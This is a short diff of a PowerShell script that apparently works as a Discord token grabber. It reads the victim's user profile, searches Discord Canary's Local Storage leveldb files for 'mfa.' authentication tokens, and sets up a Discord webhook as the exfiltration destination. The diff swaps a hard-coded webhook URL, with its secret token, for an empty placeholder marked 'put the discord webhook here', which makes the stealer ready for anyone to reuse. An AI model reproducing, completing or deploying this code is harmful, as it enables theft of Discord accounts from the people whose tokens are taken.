@@ -1,5 +1,5 @@
 $path = $env:USERPROFILE
-$web = "https://ptb.discord.com/api/webhooks/890094345619906581/WFcd8dHuhpSAEAKMRfsv7LfilfK9DugugBmMRl4QopTaPhl-Tb-sT3YcXAZ0xXsmJi3c"
+$web = "" #put the discord webhook here
 $userp = Select-String -Path "$path\AppData\Roaming\discordcanary\Local Storage\Leveldb\*.ldb" -Pattern 'mfa.'
 
 $array = $userp -Split '"'
